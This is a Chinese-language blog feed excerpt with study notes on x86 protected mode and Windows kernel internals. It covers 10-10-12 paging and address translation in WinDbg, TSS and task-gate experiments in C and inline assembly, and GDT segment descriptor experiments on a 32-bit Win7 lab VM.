    <content type="html"><![CDATA[<p>今天开始正式学习分页的相关知识</p><span id="more"></span><h2 id="分页与物理地址"><a href="#分页与物理地址" class="headerlink" title="分页与物理地址"></a>分页与物理地址</h2><h3 id="什么是物理地址"><a href="#什么是物理地址" class="headerlink" title="什么是物理地址"></a>什么是物理地址</h3><p>在学习二进制的时候就有区分过物理地址和虚拟地址这两个概念，其实就是内存条真正的地址，这里不再赘述。而学习保护模式我们知道，实际的线性地址 &#x3D; 逻辑地址+段寄存器.base，在汇编和C指针层面所使用的地址都是逻辑地址。但是似乎它等同于虚拟地址（线性地址），这是因为通常情况下段寄存器的 base 都为 0。</p><h3 id="10-10-12分页详解"><a href="#10-10-12分页详解" class="headerlink" title="10-10-12分页详解"></a>10-10-12分页详解</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>拿到一个32位的地址，将其结构进行拆分</p><img src="/2024/11/07/WindowsKernel1/1.png" class=""><p>这就是 10-10-12 分页的命名由来，而去寻找对应的物理页也是根据每个进程的 Cr3 寄存器的值去找到，整体分页结构如下图所示</p><img src="/2024/11/07/WindowsKernel1/2.png" class=""><p>同时我们也可以看到，不同的虚拟页是可以映射同一个物理页的，下面来介绍一下 PDE 和 PTE 的基本结构。</p><h4 id="物理页的属性"><a href="#物理页的属性" class="headerlink" title="物理页的属性"></a>物理页的属性</h4><img src="/2024/11/07/WindowsKernel1/3.png" class=""><p>下面描述一下各个位的作用：</p><ul><li>P 位：表示<code>PDE</code>或者<code>PTE</code>是否有效，如果有效为<code>1</code>，反之为<code>0</code>。</li><li>R&#x2F;W 位：如果<code>R/W = 0</code>，表示是只读的，反之为可读可写。</li><li>U&#x2F;S 位：如果<code>U/S = 0</code>，则为特权用户（super user），即非3环权限。反之，则为普通用户，即为3环权限。</li><li>PS位：这个位只对<code>PDE</code>有意义。如果<code>PS == 1</code>，则<code>PDE</code>直接指向物理页，不再指向<code>PTE</code>，低22位是页内偏移。它的大小为<code>4MB</code>，俗称“大页”。</li><li>A 位：是否被访问，即是否被读或者写过，如果被访问过则置<code>1</code>。</li><li>D 位：脏位，指示是否被写过。若没有被写过为<code>0</code>，被写过为<code>1</code>。</li><li>G 位：表示是否为全局页。它的作用是什么呢？举个例子，操作系统的进程的高<code>2G</code>映射基本不变，如果<code>Cr3</code>改了，<code>TLB</code>刷新重建高<code>2G</code>以上很浪费。所以<code>PDE</code>和<code>PTE</code>中有个<code>G</code>位，如果为1，刷新<code>TLB</code>时将不会刷新它指向的页。</li><li>PWT 位：当<code>PWT = 1</code>，写缓存的时候也要将数据写入内存中。</li><li>PCD 位：当<code>PCD = 1</code>时，禁止某个页写入缓存，直接写内存。比如，做页表用的页，已经存储在TLB中了，可能不需要再缓存了。</li></ul><p>需要注意的是</p><ul><li><code>PTE</code> 可以没有物理页，且只能对应一个物理页。</li><li>多个<code>PTE</code>也可以指向同一个物理页。</li><li><code>PDE</code>和<code>PTE</code>重合的属性共同决定着最终物理页的属性。比如 P 位，如果有一个是 0，那么最终的物理页就是无效的。但是<code>PDE</code>和<code>PTE</code>它们的属性的影响范围是不一样的。数值上：物理页的属性 &#x3D; PDE属性 &amp; PTE属性。</li></ul><h2 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h2><p>对于一个给定的线性地址，比如我们执行<code>mov eax,ds:[0x12345678]</code>这句汇编指令的时候，<code>0x12345678</code>这个线性地址会传递给<code>CPU</code>，先查询<strong>TLB</strong>（页表缓存）和<strong>缓存</strong>有没有，有的话直接取出来返回；如果没有，经过 MMU（Memory Management Unit，内存管理单元）处理得到物理地址，通过固定的分页模式直接找到，取出数据返回。</p><p>TLB大概就是一张表，根据线性地址和 CR3 的值去找物理页地址，如果命中，MMU将可以快速完成翻译。如果 TLB 没有对应的项，则往后会查页表的缓存，查到了也会快速返回，否则只能够去一次一次访存查询页表（这里具体的过程还没有特别弄懂，mark一下，写了新的回来补）。</p><img src="/2024/11/07/WindowsKernel1/4.png" class=""><p>上面我们经历了一遍翻译的过程，具体我们需要给入几个参数：页表基址（物理地址），线性地址，数据，寄存器，读写信号，这也就解释了为什么 CPU 不允许直接交换两个位置的内存，如果允许则这方面处理将比较麻烦，何况并不是说不提供交换内存的指令就无法实现一些功能。</p><h3 id="页表学习准备"><a href="#页表学习准备" class="headerlink" title="页表学习准备"></a>页表学习准备</h3><p>笔者用的系统是 Win7 32 位的，虽然现在 32 位的系统几乎用的很少了，但是为了系统的学习还是从简单的开始。Win7 32 默认是 2-9-9-12 分页，先用几个指令配置为更简单的 10-10-12 分页。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set pae ForceDisable  </span><br><span class="line">bcdedit /set nx AlwaysOff </span><br></pre></td></tr></table></figure><p>如果要关闭那么用下面两个指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set pae forceEnable</span><br><span class="line">bcdedit /set nx OptIn</span><br></pre></td></tr></table></figure><p>这样就回到了 2-9-9-12 分页。</p><ul><li>如果是2-9-9-12分页运行的内核 ntkrnlpa.exe</li><li>如果是10-10-12分页运行的内核 ntoskrnl.exe</li></ul><h3 id="地址翻译练习"><a href="#地址翻译练习" class="headerlink" title="地址翻译练习"></a>地址翻译练习</h3><p>但是物理地址与之完全不一样，先可以尝试通过 windbg 练习寻找物理地址，这里使用记事本配合CE。</p><img src="/2024/11/07/WindowsKernel1/5.png" class=""><p>那么得到线性地址是 <code>0029DFB0</code>，根据 10-10-12 分页规则，将页表拆开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000 1010011101 111110110000</span><br></pre></td></tr></table></figure><p>这三部分分别是，页目录项（PDE），页表项（PTE），页内偏移（offset）。</p><img src="/2024/11/07/WindowsKernel1/6.png" class=""><p>找到页表基址，获得页目录项的地址，即 <code>DirBase+4*PDE</code>。在这里页表项地址就是 <code>DirBase</code>，随后跟过去，这里需要注意，这个地址并不是真的地址，而是因为每个页表项它有一定的大小。可能装下一个页目录项就要完整的一个页，如果是这样就决定了页目录项的地址一定是页对齐的（最低三位十六进制地址为0），所以我们找到的地址再把最低三位十六进制置为0就是真实的页目录项了，而通过前面的学习也可以看到，最低的十二个位被赋予了特殊的含义。</p><p>我们找到的该内存页目录项地址实际上就是 <code>ad688000</code>，然后再页目录项中找到页表项 <code>1010011101</code> 转为十六进制得到 <code>29d</code>，同样的，页目录项地址+4*PTE 得到页的物理地址，也就是 <code>ad688a74</code>。</p><img src="/2024/11/07/WindowsKernel1/7.png" class=""><p>同样的，这里低三位十六进制也不是真实的地址，需要清零得到该页的页表基址，最后再加上页内偏移，也就是 FB0。</p><img src="/2024/11/07/WindowsKernel1/8.png" class=""><p>成功找到对应的物理内存。</p><p>而我们的 CR3 寄存器存储的就是页目录表的物理地址，即 Page Director Table，那么所说的 PDE 当然就是 Page Director Entry了。PTE 就是 Page Table Entry，对应的每个目录项指向的是一个 PTT，Page Table Table。</p><h2 id="页目录表基址与页表基址"><a href="#页目录表基址与页表基址" class="headerlink" title="页目录表基址与页表基址"></a>页目录表基址与页表基址</h2><p>由于物理地址对操作系统是不可见的，所以操作系统必须有线性访问页表的能力，唯一的办法就是将自身的页表挂在一个特殊的地址上，这个地址是 0xC0300000。</p><img src="/2024/11/07/WindowsKernel1/9.png" class=""><p>也可以发现，CR3 对应的物理地址与线性地址 0xC0300000 是一致的。</p><p>相同与页目录表基址，为了在程序内快速访问页表，也有一个页表基址，页表基址对应的线性地址是 0xC0000000。</p><p>这里记一下通过线性地址寻找PTE和PDE的公式。</p><ul><li>访问页目录表的公式：<code>0xC0300000 + PDI * 4</code></li><li>访问页表的公式：<code>0xC0000000 + PDI * 4096 + PTI * 4</code></li></ul><p>很有趣的是，你会发现如果你要寻找 0xC0300000 对应的页表，用第二个公式代入就是它本身。即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xC0300000</span><br><span class="line"></span><br><span class="line">高10位：  1100 0000 00   =   0x300</span><br><span class="line">中间10位：1100 0000 00   =   0x300</span><br><span class="line">低12位：  0000 0000 0000 =   0x000</span><br></pre></td></tr></table></figure><p>代入第二个公式可得 <code>0xC0000000 + 0x300 * 4096 + 0x300 * 4 = 0xC0300000</code></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15363603.html">https://www.cnblogs.com/wingsummer/p/15363603.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_4&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天开始正式学习分页的相关知识</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（4）——任务门</title>
    <link href="https://xia0ji233.github.io/2024/11/04/x86_4/"/>
    <id>https://xia0ji233.github.io/2024/11/04/x86_4/</id>
    <published>2024-11-03T18:00:00.000Z</published>
    <updated>2024-11-03T18:35:51.586Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下任务门相关的知识</p><span id="more"></span><p>从堆栈切换开始说起，不管是中断、陷入还是调用，提权之后 ESP 和 SS 都会被切换到对应权限的栈，那么必然有一个地方会维护这个栈所在的位置，其实就是使用任务段去维护的。</p><h2 id="任务段"><a href="#任务段" class="headerlink" title="任务段"></a>任务段</h2><h3 id="任务段介绍"><a href="#任务段介绍" class="headerlink" title="任务段介绍"></a>任务段介绍</h3><p>任务状态段简称任务段，英文缩写为<code>TSS</code>，<code>Task-state segment</code>，任务段的结构体如下所示，大小为 104 字节。</p><img src="/2024/11/04/x86_4/1.png" class=""><p>观察结构体成员，可以很明显地看到有 SS2，ESP2，SS0，ESP0 等字段，没错，这就是保存相对应任务2环和0环的堆栈信息的。<code>Intel</code> 的设计 <code>TSS</code> 目的肯定主要就是实现任务切换。<code>CPU</code> 的任务在操作系统的方面就是线程。任务一切换，执行需要的环境就变了，即所有寄存器里面的值，需要保存供下一次切换到该任务的时候再换回去重新执行。但是事实上，线程切换并不走 TSS，而是操作系统自己实现了线程切换的逻辑[1]，据说是因为 <code>intel</code> 自带的任务切换逻辑过慢[2]。</p><p><code>CPU</code> 要找到 <code>TSS</code> 需要通过 <code>TR</code> 段寄存器，<code>TR</code> 也是一个内核寄存器，<code>CPU</code> 通过 <code>TR</code> 寄存器找到 <code>TSS</code> 的方式如下图所示：</p><img src="/2024/11/04/x86_4/2.png" class=""><p>可以看到，<code>CPU</code> 保存任务段选择子在 <code>TR</code> 寄存器中，将具体的任务段描述符保存在 <code>GDT</code> 表中。</p><p>任务段描述符的段描述符结构如下</p><img src="/2024/11/04/x86_4/3.png" class=""><p>其余位基本一样了，注意这里的 B 表示任务段是否被加载进 <code>TR</code> 寄存器中，<code>B=0</code> 表示没有被加载（available）。</p><h3 id="读写-TR-寄存器指令"><a href="#读写-TR-寄存器指令" class="headerlink" title="读写 TR 寄存器指令"></a>读写 <code>TR</code> 寄存器指令</h3><p>读写分别对应 <code>Store</code> 和 <code>Load</code> 操作，也就对应 <code>STR</code> 和 <code>LTR</code> 两个指令。</p><p>同样的，读指令是可以在三环下运行，但是只能读到任务段选择子。写指令只能在零环下运行，需要提供 96 位的数据去装载任务段描述符，且加载后会导致任务段描述符的 TYPE 发生改变（<code>B</code> 位从 <code>0</code> 变为 <code>1</code>）。</p><h2 id="任务门"><a href="#任务门" class="headerlink" title="任务门"></a>任务门</h2><p>还是先来看看任务门的结构：</p><img src="/2024/11/04/x86_4/4.png" class=""><p>很简单，具体字段也不赘述了。因为任务门是在 idt 表中的，所以必然是通过 int 指令去调用。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>先写一个代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：SwitchTSS.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="built_in">stack</span>[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 0x4050a0</span></span><br><span class="line"></span><br><span class="line">DWORD g_esp;</span><br><span class="line">DWORD g_cs;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TSS</span> &#123;</span></span><br><span class="line">    DWORD link; <span class="comment">// 保存前一个 TSS 段选择子，使用 call 指令切换寄存器的时候由CPU填写。</span></span><br><span class="line">    <span class="comment">// 这 6 个值是固定不变的，用于提权，CPU 切换栈的时候用</span></span><br><span class="line">    DWORD esp0; <span class="comment">// 保存 0 环栈指针</span></span><br><span class="line">    DWORD ss0;  <span class="comment">// 保存 0 环栈段选择子</span></span><br><span class="line">    DWORD esp1; <span class="comment">// 保存 1 环栈指针</span></span><br><span class="line">    DWORD ss1;  <span class="comment">// 保存 1 环栈段选择子</span></span><br><span class="line">    DWORD esp2; <span class="comment">// 保存 2 环栈指针</span></span><br><span class="line">    DWORD ss2;  <span class="comment">// 保存 2 环栈段选择子</span></span><br><span class="line">    <span class="comment">// 下面这些都是用来做切换寄存器值用的，切换寄存器的时候由CPU自动填写。</span></span><br><span class="line">    DWORD cr3; </span><br><span class="line">    DWORD eip;  </span><br><span class="line">    DWORD eflags;</span><br><span class="line">    DWORD eax;</span><br><span class="line">    DWORD ecx;</span><br><span class="line">    DWORD edx;</span><br><span class="line">    DWORD ebx;</span><br><span class="line">    DWORD esp;</span><br><span class="line">    DWORD ebp;</span><br><span class="line">    DWORD esi;</span><br><span class="line">    DWORD edi;</span><br><span class="line">    DWORD es;</span><br><span class="line">    DWORD cs;</span><br><span class="line">    DWORD ss;</span><br><span class="line">    DWORD ds;</span><br><span class="line">    DWORD fs;</span><br><span class="line">    DWORD gs;</span><br><span class="line">    DWORD ldt;</span><br><span class="line">    DWORD io_map;</span><br><span class="line">&#125; TSS;</span><br><span class="line">TSS tss = &#123;<span class="comment">// 0x00405000</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//link</span></span><br><span class="line">    (DWORD)<span class="built_in">stack</span>,<span class="comment">//esp0</span></span><br><span class="line">    <span class="number">0x00000010</span>,<span class="comment">//ss0</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//esp1</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ss1</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//esp2</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ss2</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//cr3</span></span><br><span class="line">    <span class="number">0x00401000</span>,<span class="comment">//eip</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//eflags</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//eax</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ecx</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//edx</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ebx</span></span><br><span class="line">    (DWORD)<span class="built_in">stack</span>,<span class="comment">//esp</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ebp</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//esi</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//edi</span></span><br><span class="line">    <span class="number">0x00000023</span>,<span class="comment">//es  </span></span><br><span class="line">    <span class="number">0x00000008</span>,<span class="comment">//cs  </span></span><br><span class="line">    <span class="number">0x00000010</span>,<span class="comment">//ss</span></span><br><span class="line">    <span class="number">0x00000023</span>,<span class="comment">//ds</span></span><br><span class="line">    <span class="number">0x00000030</span>,<span class="comment">//fs</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//gs</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ldt</span></span><br><span class="line">    <span class="number">0x20ac0000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) func() &#123;<span class="comment">//00401000</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">            <span class="type">int</span> <span class="number">3</span></span><br><span class="line">            mov g_esp, esp</span><br><span class="line">            mov eax, <span class="number">0</span></span><br><span class="line">            mov ax, cs</span><br><span class="line">            mov g_cs, eax</span><br><span class="line">            iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func=%x tss=%x stack=%x\n&quot;</span>,func,&amp;tss,<span class="built_in">stack</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input cr3:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;(tss.cr3));</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        call fword ptr [buffer]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_cs = %08x\ng_esp = %08x\n&quot;</span>, g_cs, g_esp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后向 0x48 这个段描述符构造一个任务段，段描述符为 0000e940&#96;5000ffff。</p><p>然后找到该进程 cr3 的值，这里 cr3 寄存器是保存程序页表的物理地址使用的，windbg中输入 <code>!process 0 0</code> 即可查看，dirbase 即是该值。</p><img src="/2024/11/04/x86_4/5.png" class=""><p>但是试了很多次，发现都会直接导致虚拟机关闭 or 蓝屏，这个进行不下去了可能得先一放下，下篇开始学分页。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15330063.html">https://www.cnblogs.com/wingsummer/p/15330063.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_3&#x2F;</a></li><li>[3]：<a href="https://allen.blog.csdn.net/article/details/52651598">https://allen.blog.csdn.net/article/details/52651598</a></li></ul>]]></content>
    
    
    <summary type="html">学习一下任务门相关的知识</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    <category term="X86" scheme="https://xia0ji233.github.io/categories/X86/"/>
    
    <category term="Protected_Mode" scheme="https://xia0ji233.github.io/categories/X86/Protected-Mode/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（3）——门描述符实验</title>
    <link href="https://xia0ji233.github.io/2024/10/08/x86_3/"/>
    <id>https://xia0ji233.github.io/2024/10/08/x86_3/</id>
    <published>2024-10-07T16:00:00.000Z</published>
    <updated>2024-10-07T16:42:15.803Z</updated>
    
    <content type="html"><![CDATA[<p>通过做实验来加深一下印象</p><span id="more"></span><p>首先是环境搭建，寻找32位虚拟机花了很长时间，最后在<a href="https://www.52pojie.cn/thread-1644554-1-1.html"><strong>52破解</strong></a>上找到了合适的系统。如果你尝试自己搭建你会发现，win7 32镜像很难寻找，而且大部分不支持 <code>Vmware Tools</code>，帧率很低很卡，调试起来很不舒服。</p><p>而笔者给出的链接中的 32 位虚拟机还是很不错的，能调试，能装 <code>Vmware Tools</code>。还需要提醒一点的是，解压好之后把 CPU 个数和核心数全部改成 1，不然实验容易炸。</p><h2 id="段描述符实验"><a href="#段描述符实验" class="headerlink" title="段描述符实验"></a>段描述符实验</h2><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><p>首先根据 gdt 表，找到 32 位程序的 CS 中段选择子 <code>0x1b</code> 去找到对应的 32 位段描述符。</p><img src="/2024/10/08/x86_3/1.png" class=""><p>也就是图中 +0x18 偏移处的 00cffb00&#96;0000ffff。</p><p>Base 分别在高四字节的首位各一个字节+低四字节的高 2 字节，刚好全是 0。</p><p>Limit 就是最低的 2 字节配上高字的低半个字节，组合起来也就是 0xFFFFF。</p><p>TYPE 值就是 0xb，查表得知，是代码段，可读可执行。</p><p>P DPL S 的结果是 0xf，表明数据是全1。</p><p>P 为 1，表明段有效。</p><p>DPL 为 3，表明该代码段的权限是 3 环的。</p><p>S 为 1，表明是代码&#x2F;数据段</p><p>剩下还有一个 G 位为 1，表明段限长以页为单位。D&#x2F;B 位为 1，表明是 32 位程序。</p><hr><p>此时我做个小实验，我创建一个新的代码段描述符，我将 D&#x2F;B 位改成 0，使之变为一个 16 位的代码段，直接抄 +0x18 处的段描述符，将 D&#x2F;B 位修改一下得到 008ffb00&#96;0000ffff。</p><p>从图中可以看到 +0x48 的位置是一个空的段描述符，直接将值写入。</p><img src="/2024/10/08/x86_3/2.png" class=""><p>用一个长调用去改段选择子为 0x4b。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>()&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov eax,<span class="number">0x12345678</span>;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">*(<span class="type">int</span> *)&amp;bufcode[<span class="number">0</span>]=(<span class="type">int</span>)test;</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/10/08/x86_3/3.png" class=""><p>可以发现，写的 <code>mov eax,0x12345678</code> 的字节码被解析成了 16 位的，也就是说，原本 <code>mov eax,0x12345678</code>字节码 <code>B8 78 56 34 12</code> 因为代码段位数的变化导致只能将 <code>B8 78 56</code> 视为 <code>mov ax,0x5678</code> 而只执行了这个，往后跳转到 <code>34</code> 字节开头的代码，从寄存器中也可以看到 eax 的值变为了 0x5678，表明执行了 16 位的代码而非 32 位的代码。</p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>32 位的程序 ds 通常是 0x23，也就是 +0x20 的位置，gdt 表项为 00cff300&#96;0000ffff。其实和代码段的差别就是 TYPE 域，其余基本一样，TYPE 为 3 是数据段，可读可写。</p><p>这里稍微改一改其它参数，例如改段基址为 1，同样是 0x4b 处的段描述符，改成 00cff300&#96;0001ffff。</p><img src="/2024/10/08/x86_3/4.png" class=""><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a=<span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov ax,<span class="number">0x4b</span>;</span><br><span class="line">mov ds,ax;</span><br><span class="line">mov ebx, <span class="number">0x12345678</span>;</span><br><span class="line">mov eax,[ebx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><img src="/2024/10/08/x86_3/5.png" class=""><p>发现我们修改了 ds 之后再次尝试读取内存已经是读取基址（1）+ 偏移的形式了，其实平时我们给的读取地址都是偏移，只不过段描述符中的基址通常是 0。</p><p>读取全局变量 a 的值也可以发现，也是对应的读取了 + 1 上的偏移。</p><img src="/2024/10/08/x86_3/6.png" class=""><p>再尝试看看段长限制，因为代码段和普通数据段几乎都是 <code>0-0xffffffff</code> 的范围，所以这里换一个段描述符，尝试使用 fs 段寄存器，32 位通常的值是 0x3b，FS 段寄存器指向了存储了<strong>线程环境块</strong>（TEB）的地址。</p><p>尝试访问 <code>fs dword ptr [0x1000]</code>，直接报访问错误，并且访问的真实地址我们看不到，这是被段长限制住了。</p><img src="/2024/10/08/x86_3/8.png" class=""><p>这里需要注意的是，线程会发生切换，线程切换的时候会修改 gdt 表，所以我们中断 windbg 看到的 gdt 表对应的 0x3b表项是不准确的[1]。通常情况下，fs 的段基址是 0x7FFDF000，同样为了找到真实的段基址，后续使用调用门提权的时候可以中断下来看看 gdt 表。</p><p>这里根据基址构建一个段描述符 7f40f3fd&#96;f0000fff，windbg里面 dg 命令可以查看段选择子对应的信息。</p><img src="/2024/10/08/x86_3/9.png" class=""><p>这里将 TYPE 修改为向下扩展的类型，也就是将 3 变为 7，修改为 7f40f7fd&#96;f0000fff。</p><p>可以发现，原来可以访问的地址变为不可访问</p><img src="/2024/10/08/x86_3/10.png" class=""><p>原来不可访问的地址变得可访问</p><img src="/2024/10/08/x86_3/11.png" 